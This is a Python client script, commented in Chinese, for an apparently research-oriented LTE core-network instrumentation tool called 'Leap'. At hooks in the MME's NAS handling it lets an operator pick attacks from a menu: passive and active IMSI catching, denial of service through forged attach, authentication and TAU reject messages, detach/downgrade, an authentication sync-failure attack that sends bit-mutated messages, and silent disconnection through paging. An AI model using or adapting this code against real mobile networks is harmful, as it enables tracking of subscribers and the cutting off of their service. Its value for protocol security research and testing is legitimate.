# -*- coding:UTF-8 -*-

"""
说明：
1.优化了旧版的客户端，将所有的操作汇总到了一个脚本中，不再需要根据不同的攻击去编写不同的脚本
2.增加了根据用户输入再决定执行不同攻击的功能，使其更加灵活
3.用户可以在每一处插桩点发送所有种类的指令，使客户端对协议栈的控制更加灵活
"""

import random
from leap.leap import *
from leap.leap_message_def import *
from ctypes import pointer

# 数据接收缓冲区的大小
buf_size = 4096

# 与服务端建立连接
le = leap("192.168.137.99", "7897")

# 与服务端进行通信
while True:
    # 接收消息
    message_id, ue_id, length, msg = le.recv(buf_size)
    # 解码 nas 消息
    nas_msg = le.nas_message_decode(msg)

    if message_id == LEAP_INITIAL_NAS_DATA:
        # MME 开始处理 UE 初始 attach_request 之后，且还没有发送 auth_request 之前
        print("[Leap]: 当前插桩点为 epc/mme/nas.cc: handle_imsi_unknown_ue_attach()")

    elif message_id == LEAP_AUTH_FAILURE:
        # 鉴权同步失败时，MME 开始处理 auth_failure 之后，且还没有发送 auth_request 之前
        print("[Leap]: 当前插桩点为 epc/mme/nas.cc: handle_auth_failure()")

    elif message_id == LEAP_ATTACH_COMPLETE:
        # UE 完成 attach 后
        print("[Leap]: 当前插桩点为 epc/mme/nas.cc: handle_attach_complete()")

    # 发送指令
    command_id = -2
    while True:
        command_id = int(input("[Leap]: 请输入您希望执行的指令: "))

        if command_id == -1:
            print("[Leap]: exit loop")
            le.exit_loop()
            break

        if command_id == 1:
            # IMSI抓取（被动）
            print("[Leap]: imsi catching")
            imsi = pointer(nas_msg.contents.attach_request.oldgutiorimsi.imsi)
            ppstruct(imsi)

        if command_id == 4:
            # 拒绝服务攻击
            print("[Leap]: set and send attach_reject message")
            le.send_attach_reject(ue_id)

        elif command_id == 9:
            # 麻木攻击
            print("[Leap]: set and send authentication_reject message")
            le.send_authentication_reject(ue_id)

        elif command_id == 10:
            # 分离/降级攻击
            print("[Leap]: send network initiated detach_request message")
            le.send_detach_request(ue_id)

        elif command_id == 11:
            # 鉴权同步失败攻击
            print("[Leap]: auth_sync_failure attack")
            le.execute_auth_sync_failure_attack()
            for i in range(5):
                modified_msg = msg[:13] + chr(0x80 >> random.randint(0, 7)) + chr(0x80 >> random.randint(0, 7)) + msg[15:]
                le.send(modified_msg)

        elif command_id == 13:
            # 悄然中断攻击
            print("[Leap]: send paging message with imsi")
            le.execute_stealthy_kicking_off_attack(ue_id)

        elif command_id == 14:
            # 拒绝服务攻击
            print("[Leap]: set and send tau_reject message")
            le.send_tau_reject(ue_id)

        elif command_id == 15:
            # IMSI抓取（主动）
            print("[Leap]: set and send identity_request message")
            le.send_identity_request(ue_id)

        else:
            print("[Leap]: 您输入的指令不存在，请重新输入！")
